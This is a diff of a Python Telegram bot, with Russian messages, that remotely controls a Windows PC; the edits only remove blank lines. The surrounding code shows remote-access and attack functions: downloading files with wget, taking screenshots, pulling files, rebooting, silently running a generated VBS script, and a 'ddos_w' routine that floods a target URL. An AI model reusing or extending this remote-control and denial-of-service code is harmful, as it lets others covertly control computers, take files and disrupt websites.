@@ -15,7 +15,6 @@ with open("config.json", 'r', encoding='utf-8') as f:
     data = jsn.load(f)
 
 class Data:
-    
     id      = data["white_list"]
     inform  = data["info"]
     update  = data["update"]
@@ -38,9 +37,7 @@ TOKEN_PC=[Data.name, Data.token]
 bot=telebot.TeleBot(TOKEN_PC[1])
 
 class Func_API:    
-    
     def __init__(self) -> None:
-        
         self.NAME_PC = TOKEN_PC[0]
         self.tg_api = bot
         for ids in id:
@@ -48,8 +45,7 @@ class Func_API:
                 bot.send_message(ids, f'{self.NAME_PC} run...')
             except telebot.apihelper.ApiTelegramException:
                 pyautogui.alert("Вы указали неверный токен")
-                bot.stop_polling()
-                
+                bot.stop_polling()   
 
     def rasbiv(self,text):
         texn=text.split()
@@ -59,7 +55,6 @@ class Func_API:
         return {"name": texn[0],
                 "cmnd": texn[1],
                 "text": texc}
-
 
     def find_name(self,fig):
         lop=0
@@ -111,13 +106,11 @@ class Func_API:
         except:
             bot.send_message(self.id, '🖥❌')
 
-
     def exits(self):
         dir=os.listdir("media/")
         for i in dir:
             os.remove("media/"+i)
         bot.send_message(self.id,"🖥✅")
-
 
     def ip_address(self):
         try:
@@ -141,14 +134,12 @@ class Func_API:
         except requests.exceptions.ConnectionError:
             bot.send_message(self.id, 'Erorre')
 
-
     def wgt(self,text_comand):
         try:
             wget.download(text_comand[0],text_comand[1])
             bot.send_message(self.id,"🖥✅")
         except:
             bot.send_message(self.id, '🖥❌')
-
 
     def rebooting(self,timer):
         try:
@@ -165,7 +156,6 @@ class Func_API:
             bot.send_message(self.id,"🖥✅")
         except:
             bot.send_message(self.id, '🖥❌')
-
 
     def picture(self,file):
         try:
@@ -230,7 +220,6 @@ Screen:        {x}x{y}"""
         except:
             bot.send_message(self.id, '🖥❌')
 
-
     def print_gui(self,text):
         try:
             pyautogui.alert(text, "~")
@@ -259,7 +248,6 @@ Screen:        {x}x{y}"""
             bot.send_message(self.id, '🖥✅')
         except:
             bot.send_message(self.id, '🖥❌')
-
 
     def direct(self,paths):
         try:
@@ -298,7 +286,6 @@ sh.Run "{pth}\\upd.bat", 0'''
         open('upd.vbs','w').write(text_vbs)
         os.startfile('upd.vbs')
         bot.stop_polling()
-
 
     def ddos_w(self,url):
         r = requests.Session()
@@ -360,7 +347,6 @@ sh.Run "{pth}\\upd.bat", 0'''
             if comnd=="shotdown" or comnd=="shdn" or comnd=="vikl":
                 threading.Thread(target=self.shotdowning, args=(text_comand[0], )).start()
                 
-
             if comnd=="picture" or comnd=="pict":
                 threading.Thread(target=self.picture, args=(text_comand[0], )).start()
 
@@ -418,7 +404,6 @@ sh.Run "{pth}\\upd.bat", 0'''
 
             if comnd=="browser" or comnd=="brws":
                 threading.Thread(target=self.browser, args=(text_comand[0], )).start()
-
             
             if comnd=="pull" or comnd=="pull_file":
                 threading.Thread(target=self.pull_file, args=(text_comand[0], )).start()
